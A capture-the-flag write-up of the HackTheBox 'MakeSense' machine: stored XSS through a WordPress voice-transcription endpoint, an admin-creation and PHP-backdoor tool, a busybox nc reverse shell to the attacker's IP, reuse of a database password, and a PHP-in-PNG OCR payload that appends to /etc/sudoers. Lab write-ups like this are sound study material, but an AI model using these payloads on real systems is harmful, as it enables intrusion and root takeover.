---
layout: post
title: "MakeSense"
date: 2026-07-04 00:00:00 -0700
categories: challenges
description: A WordPress voice-transcription widget ships its own AES key and a word-to-symbol XSS trick client-side — complete with a JSDoc comment admitting what it's for — which trips a headless-Chrome reviewer bot into creating a rogue admin and dropping a PHP backdoor; the leaked DB password is reused as a local account's OS password, and a root-owned OCR endpoint that saves recognized text as an executable file supplies the sudoers write that finishes the job.
parent: HackTheBox - Season 11
grand_parent: Challenges
event: "htb-season-11"
tags:
  - "HackTheBox"
  - "Linux"
  - "WordPress"
  - "stored-xss"
  - "client-side-encryption"
  - "password-reuse"
  - "web-shell"
  - "ocr-rce"
  - "sudoers-injection"
  - "T1190"
  - "T1552.001"
  - "T1078.003"
  - "T1505.003"
  - "T1059.004"
  - "T1548.003"
---
# MakeSense

## Engagement Notes

MakeSense is a Linux box built around a WordPress site with a browser-based
voice-transcription feature (Whisper + Transformers.js, running client-side).
The interesting bug isn't hidden — the site's own JavaScript ships a JSDoc
comment on the function that maps spoken words like "open bracket" back to
literal symbols, and that comment says outright what it's for: *"Map spoken
words to their symbol equivalents for XSS injection."* The rest of the chain
follows from taking that hint seriously: a crafted "transcription" reaches an
authenticated review bot as stored XSS, a public WordPress-exploitation tool
turns that into a rogue admin account and a PHP backdoor, a leaked database
password turns out to be reused as a local Linux account's password, and a
root-owned "OCR" microservice that writes recognized text straight to a file
on disk supplies the final privilege-escalation primitive.

## Attack path

1. **Recon** → `makesense.htb` has 22 (ssh) and 443 (https) open.
2. **Recon leak** → `gobuster` finds a readable `.gitignore`, which maps out
   an `ai-models/` directory holding a Whisper model and a summarization
   model behind a custom `webagency` WordPress theme.
3. **The hint** → the theme's `whisper-wrapper.js` ships a hardcoded AES key
   and an `applySymbolMapping()` function whose own JSDoc comment says it
   exists "for XSS injection."
4. **Stored XSS** → an encrypted "transcription" payload is crafted directly
   (bypassing the actual voice/microphone flow) and POSTed to
   `wp-admin/admin-ajax.php?action=save_voice_results`; a `HeadlessChrome`
   UA fetches the injected `<script src>` moments later, confirming an
   authenticated review bot renders submissions unescaped.
5. **XSS → RCE** → the public tool **WPXStrike** is used to turn that XSS
   into a rogue WordPress administrator account and to drop a PHP backdoor
   plugin (`WPAnalytics.php`).
6. **Foothold** → the backdoor is called directly with a `busybox nc ... -e sh`
   reverse shell, landing as `www-data`.
7. **User pivot** → `wp-config.php`, read from that shell, leaks the site's
   DB credentials; the DB password turns out to be reused as the local
   `walter` account's OS password → `user.txt`.
8. **Internal recon** → as `walter`, a root-owned PHP dev server is found
   bound to `127.0.0.1:8001`, serving an internal "OCR" tool from
   `/root/ocr4/`.
9. **Privilege escalation** → a PNG is crafted (via PIL) containing literal
   PHP text that appends `walter ALL=(ALL:ALL) ALL` to `/etc/sudoers`; it's
   submitted through the OCR service's canvas-upload flow and saved
   server-side as an executable file. `sudo su` as `walter` completes the
   privilege escalation to root.

## Enumeration

```console
$ rustscan -a $target
...
Open 10.129.29.167:22
Open 10.129.29.167:443
...
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

```console
$ gobuster dir -k -u https://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/common.txt -x txt,js,html,php -t 10 --timeout=6s -b 301
...
.git/logs/           (0.26%) (Status: 200) [Size: 34914]
.gitignore           (Status: 200) [Size: 1055]
.hta                 (0.38%) (Status: 403) [Size: 279]
[...403 spam for .htaccess/.htpasswd variants elided...]
```

`.git/logs/` (34KB) came back 200 but had nothing actually exfiltratable when
checked — a dead end. The `.gitignore`, on the other hand, was enough on its
own to map the app without needing to pull the rest of the `.git` tree:

```console
$ curl -k https://$target/.gitignore
...
# WordPress
wp-content/cache/
wp-content/database/
...
# Model files - excluded from repository (download via scripts)
*.gguf
*.bin
*.safetensors

# AI models - only exclude the large model files, keep transformers.js library
wp-content/ai-models/models/

# HuggingFace cache (Whisper models auto-download here)
.cache/huggingface/
```

That last block points straight at an AI feature. A directory listing on the
excluded path confirms it:

```
Index of /wp-content/ai-models/models
distilbart-cnn-12-6/
whisper-tiny.en/
```

## The hint — a JSDoc comment doing the challenge author's job

Pulling the theme's client-side JS shows a browser-based voice recorder
(`recorder-worklet.js`) that transcribes audio locally with Whisper
(Transformers.js) and posts the result to WordPress. `whisper-wrapper.js`
ships a **hardcoded** symmetric key right in the source:

```js
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

...and a function that maps spoken words back to punctuation — with a
comment that says exactly what it's for:

```js
/**
 * Map spoken words to their symbol equivalents for XSS injection
 * @param {string} text - The text to apply mapping to
 * @returns {string} Text with symbols replaced
 */
applySymbolMapping(text) {
    if (!text) return '';

    const mappings = {
        'open bracket': '<',
        'close bracket': '>',
        'slash': '/',
        'quote': "'",
        'double quote': '"',
        ...
    };
```

> 🧠 Some time went into reading a hacktricks explainer on Whisper/WordPiece
> tokenizer internals first, hoping it would explain how the word-mapping
> trick worked under the hood — it turned out to be an unrelated detour. The
> real answer was sitting in the site's own JSDoc: the author's comment
> ("for XSS injection") is the actual hint, not anything about how the
> tokenizer segments text.

A Python mirror of the same word→symbol table turns any literal payload into
its spoken-word form:

```python
xss_translator("<script>document.location='http://10.10.14.85:9999'</script>")
# 'open bracket script close bracket document dot location equals quote http colon slash slash 10 dot 10 dot 14 dot 85 colon 9999 quote open bracket slash script close bracket'
```

> 🧠 Voice was actually tried through the real browser UI first — speaking
> the payload aloud into the microphone. It technically worked but was
> impractical to iterate on, so the encrypted `save_voice_results` payload
> was crafted directly instead, once the AES key and the mapping logic were
> both in hand. In hindsight, none of the voice/encryption machinery was
> strictly necessary — the site's plain contact-form submission
> (`action=submit_contact_form`) reaches the same nonce-protected endpoint
> and could have carried the same payload with far less engineering.

## Foothold — stored XSS via the encrypted transcription field

The AES-GCM scheme is a straight port of the client's own `encryptPayload()`
(SHA-256 of the key, random 12-byte IV, IV+ciphertext+tag, base64):

```python
def encrypt_payload(payload: str, encryption_key: str) -> str:
    template = {"transcription": payload, "summary": ""}
    key_material = SHA256.new(encryption_key.encode()).digest()
    iv = get_random_bytes(12)
    cipher = AES.new(key_material, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(json.dumps(template).encode())
    return b64encode(iv + ciphertext + tag).decode()
```

A first attempt to replay a captured `encrypted_payload` through raw `curl`
multipart failed (`0` response) — the boundary declared in the
`Content-Type` header didn't match the boundary actually used in the body (a
manual copy-paste slip, one digit off). Switching to Python's `requests`
(which builds the multipart body correctly) fixed it:

```python
nonce = requests.get('https://makesense.htb', verify=False).text.split('nonce":"')[1].split('"')[0]
post_data = {
    "action": "save_voice_results",
    "nonce": nonce,
    "post_id": 69,
    "encrypted_payload": encrypt_payload("<script src='http://10.10.14.85:9999/hello.js'></script>", encryption_key[0]),
}
submit = requests.post('https://makesense.htb/wp-admin/admin-ajax.php', data=post_data, verify=False)
# {"success":true,"data":{"message":"Results saved successfully!","post_id":69}}
```

Moments later, a catcher on the attacker box gets a hit:

```console
$ nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.29.167 56044
GET / HTTP/1.1
Host: 10.10.14.85:9999
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/148.0.0.0 Safari/537.36
```

> 🧠 The `HeadlessChrome` UA wasn't a specific deduction — it's the expected
> shape of how the challenge emulates a human reviewer/admin visiting
> submitted content. Seeing it confirmed the XSS actually executes in an
> authenticated session rather than just being reflected back inertly.

## XSS → RCE — WPXStrike drops an admin account and a backdoor

`hello.js` is served from `payloads/WPXStrike/`, a public WordPress
exploitation tool ([github.com/nowak0x01/WPXStrike](https://github.com/nowak0x01/WPXStrike))
that converts an XSS primitive into RCE against WordPress. Once it runs
inside the bot's admin session it calls a `WPCreateAccount` module against
`wp-admin/user-new.php`, and exfiltrates confirmation to a second catcher:

```console
$ python -m http.server 9999
10.129.29.225 - - "GET /hello.js HTTP/1.1" 200 -

$ python server.py
Listening on 0.0.0.0:8080
--- REQUEST: POST /
  [body] {"Host":"https://makesense.htb/wp-admin/user-new.php","Module":"WPCreateAccount.WPXCreateAccount()","Message":"[Sucessful] The user has been successfully created!.","Data":{"User":"tokugero","Email":"toku@makesense.htb","Password":"Password12345!","Role":"administrator","FirstName":"","LastName":""},"Date":"Sat, 04 Jul 2026 23:43:29 GMT"}
```

The same tool also dropped a PHP backdoor plugin, `WPAnalytics.php`, through
the rogue admin session — the notebook doesn't capture the upload step
itself, only its result: a `phpinfo()` proof, followed by a reverse shell:

```python
payload = {
    "OGa93dka": base64.b64encode(b"phpinfo();"),
    "K189mD2j": base64.b64encode(b"phpinfo")
}
requests.post('https://makesense.htb/wp-content/plugins/WPAnalytics/WPAnalytics.php', verify=False, data=payload)
```

```python
payload = {
    "OGa93dka": base64.b64encode(b"busybox nc 10.10.14.85 8080 -e sh"),
    "K189mD2j": base64.b64encode(b"passthru")
}
requests.post('https://makesense.htb/wp-content/plugins/WPAnalytics/WPAnalytics.php', verify=False, data=payload)
```

That shell lands as `www-data`.

## User pivot — password reuse to walter

Reading `wp-config.php` from the `www-data` shell leaks the site's database
credentials and WordPress auth salts:

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDA…ri3!' );
// [8 WordPress AUTH_KEY/SALT cookie-signing constants elided — high-entropy,
//  not reused anywhere else in the chain]
```

> 🧠 `walter` — the DB user — shares its password with the actual local
> Linux account of the same name. That password reuse is what pivots off the
> `www-data` webshell context into a real interactive session:

```console
walter@makesense:~$ ls -alhn
-rw-r----- 1    0 1000   33 Jul  4 22:37 user.txt
walter@makesense:~$ cat user.txt
ff520830…bb32
```

## Internal recon — a root-owned OCR service

```console
walter@makesense:/opt/google/chrome$ ss -tulpn
...
tcp   LISTEN   127.0.0.1:8001    0.0.0.0:*
tcp   LISTEN   0.0.0.0:443       0.0.0.0:*
tcp   LISTEN   0.0.0.0:22        0.0.0.0:*
```

> 🧠 `walter`'s shell landing inside `/opt/google/chrome` wasn't a deliberate
> breadcrumb hunt — `walter` is the OS account the HeadlessChrome
> reviewer/bot from the XSS stage actually runs as, so its working directory
> just happens to sit next to the browser binary.

```console
walter@makesense:/tmp$ ps -ef | grep php
root  1370  1289  0 Jul04 ?  00:00:00 php -S 127.0.0.1:8001 -t /root/ocr4/
```

Loopback-only and root-owned. `curl localhost:8001` returns "Authentication
required":

![Browser HTTP Basic auth prompt for the internal localhost:8001 service](/assets/images/ctf/events/season11-htb-26/makesense/ocr-service-basic-auth-prompt.png)

The operator's own note at this point is blunt: "walter & creds works on
this site" — the same reused DB password unlocks the Basic-auth prompt
(sent as `Authorization: Basic d2FsdGVyOk…aTMh`, i.e. `walter:` + the
`wp-config.php` password, in the requests that follow):

![MakeSense internal OCR tool — Draw text, Read it back canvas app](/assets/images/ctf/events/season11-htb-26/makesense/ocr-app-ui.png)

The internal app is "Draw text. Read it back." — a canvas-drawing OCR tool
that saves the recognized text to a file. An earlier, unrelated probe of the
same app confirms saved output is served straight back as a file under
`/saved/`:

![Browsing to http://localhost:8001/saved/saved.php, rendering garbled OCR text "YOK v" from an earlier test](/assets/images/ctf/events/season11-htb-26/makesense/ocr-saved-output.png)

## Privilege escalation — PHP-in-a-PNG through the OCR save path

Rather than hand-draw text, a PNG is generated directly with literal PHP
inside it, using the sudoers line as the payload:

```python
from PIL import Image, ImageDraw, ImageFont, ImageOps

text = "<?php\nsystem(\"echo 'walter ALL=(ALL:ALL) ALL' >> /etc/sudoers\" );"
font = ImageFont.load_default(size=40)
image = Image.new('RGB', (1500, 300), color=(255, 255, 255))
draw = ImageDraw.Draw(image)
draw.text((20, 80), text, font=font, fill=(0, 0, 0))
image = ImageOps.expand(image, border=10, fill='black')
image.save('hello.png')
```

![Rendered PNG containing literal PHP text: system(echo walter ALL=(ALL:ALL) ALL >> /etc/sudoers)](/assets/images/ctf/events/season11-htb-26/makesense/sudoers-payload-image.png)

The image is submitted to the OCR endpoint's canvas-upload flow, and the
returned `ocr_id` is used to save the recognized text under an
attacker-chosen, executable filename:

```python
canvas_payload = {'canvas_image': f'data:image/png;base64,{image_base64}'}
# [~2KB base64 PNG elided]
soup = BeautifulSoup(requests.post('http://localhost:8001/', headers=headers, data=canvas_payload).text, 'html.parser')
ocrid = soup.find('input', {'name': 'ocr_id'})['value']

payload = {"ocr_id": ocrid, "filename": "shell.php", "save_output": "whoami"}
requests.post('http://localhost:8001/', data=payload, headers=headers)
```

The notebook's own capture of that last response is just the app's generic
landing-page HTML, not command output — the actual execution of the saved
`shell.php` and the resulting sudoers write aren't shown as a captured cell.

> 🧠 The sudoers injection did land: `sudo su` as `walter` completed the
> privilege escalation to root. The root shell itself (and `root.txt`)
> weren't captured in the notebook — this is stated on the operator's
> confirmation, not reconstructed from any cell, and no root-shell transcript
> is claimed here.

## What didn't work

- **`gobuster vhost`** turned up only `www.makesense.htb` (a plain redirect)
  before being interrupted — no extra vhosts.
- **`.git/logs/`** returned 200 but had no actual log content worth
  exfiltrating; the `.gitignore` alone supplied enough of the app's map.
- **A raw `curl` multipart replay** of a captured `encrypted_payload` failed
  with a bare `0` response — an off-by-one boundary name between the
  `Content-Type` header and the body, not a discovered validation behavior.
  Switching to Python `requests` (correct multipart framing) fixed it
  immediately.
- **The ONNX path-traversal advisory** ([CVE-2026-27489](https://github.com/advisories/GHSA-3r9x-f23j-gc73))
  was researched right after pulling `transformers.js` from the AI-models
  directory, but nothing in the notebook shows it being exploited — it looks
  like a researched-and-shelved lead once the JS-comment hint pointed
  directly at the XSS path instead.
- **Actually speaking the payload into the microphone** worked, but wasn't
  worth iterating on — crafting the encrypted `transcription` field directly
  was far faster once the key and mapping were known.

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| rustscan | Initial port scan | [github.com/RustScan/RustScan](https://github.com/RustScan/RustScan) |
| gobuster | Directory and vhost discovery | [github.com/OJ/gobuster](https://github.com/OJ/gobuster) |
| WPXStrike | Weaponized the stored XSS into a rogue admin account and a PHP backdoor | [github.com/nowak0x01/WPXStrike](https://github.com/nowak0x01/WPXStrike) |
| busybox nc | Reverse shell from the PHP backdoor | — |
| PIL (Pillow) | Rendered the sudoers-injection payload as a PNG for the OCR upload | — |
| requests / BeautifulSoup | Drove the encrypted XSS payload delivery and the OCR canvas-upload flow | — |

## Tactics (MITRE ATT&CK)

Only techniques whose definition matches what happened, each verified
against its ATT&CK page:

| Technique | ID | Where |
|---|---|---|
| Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190/) | Stored XSS via the `save_voice_results` AJAX endpoint, executed in an authenticated bot session |
| Server Software Component: Web Shell | [T1505.003](https://attack.mitre.org/techniques/T1505/003/) | `WPAnalytics.php` PHP backdoor dropped via WPXStrike |
| Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | `busybox nc ... -e sh` reverse shell spawned via the backdoor |
| Unsecured Credentials: Credentials In Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | `DB_PASSWORD` read from `wp-config.php` |
| Valid Accounts: Local Accounts | [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | The leaked DB password reused as `walter`'s local OS account password |
| Abuse Elevation Control Mechanism: Sudo and Sudo Caching | [T1548.003](https://attack.mitre.org/techniques/T1548/003/) | PHP-in-PNG payload appends `walter ALL=(ALL:ALL) ALL` to `/etc/sudoers` via the OCR save path, then `sudo su` |

> **Not tagged, and why:** stored cross-site scripting itself has no clean
> 1:1 ATT&CK Enterprise technique. [**T1189 Drive-by Compromise**](https://attack.mitre.org/techniques/T1189/)
> was considered — its definition does list XSS in exploited web-application
> interfaces as one delivery mechanism — but its scope is a *client endpoint*
> compromised while a user browses to a site, not an authenticated bot's
> in-app session being abused to take an action (creating an admin account)
> inside the same application. That mismatch is described in prose instead
> of forced into a tag.

## Lessons

- **Read the client-side source's own comments before reaching for external
  research.** The vulnerability was announced outright in a JSDoc comment
  ("for XSS injection") — the tokenizer deep-dive that preceded finding it
  turned out to be unrelated.
- **The simplest path in isn't always the one taken.** The encrypted
  voice-transcription flow worked, but the site's plain contact-form
  endpoint reached the same vulnerable sink with none of the AES/mapping
  overhead — worth checking for a simpler existing path before building a
  complex one.
- **Credentials leak sideways, not just up.** A WordPress database password
  turning out to be the same as a real Linux account's password is a small
  detail with an outsized payoff — always worth testing config-file
  credentials against local accounts, not just the service they were found
  in.

## Further reading

**Used during the engagement:**
- [rustscan](https://github.com/RustScan/RustScan)
- [gobuster](https://github.com/OJ/gobuster)
- [WPXStrike](https://github.com/nowak0x01/WPXStrike) — XSS-to-RCE tool for WordPress, used to create the rogue admin account and drop the PHP backdoor

**Reference material (added for study, not consulted during the solve):**
- [hacktricks — LLM tokenizing (WordPiece)](https://hacktricks.wiki/en/AI/AI-llm-architecture/1.-tokenizing.html) — read while investigating the AI-models directory; turned out unrelated to the actual bug
- [CVE-2026-27489 / GHSA-3r9x-f23j-gc73](https://github.com/advisories/GHSA-3r9x-f23j-gc73) — ONNX path-traversal advisory researched alongside the exposed `transformers.js`, not used in the final chain

---

*Provenance: commands, outputs, credentials, and flags are transcribed from
the engagement notebook (credential material partially redacted). External
facts (the WPXStrike repository, the ONNX advisory, and the MITRE ATT&CK
technique definitions) are linked to their source and were fetched, not
recalled. Root access is stated per the operator's own confirmation during
interview; the notebook does not capture a root shell or `root.txt`.*
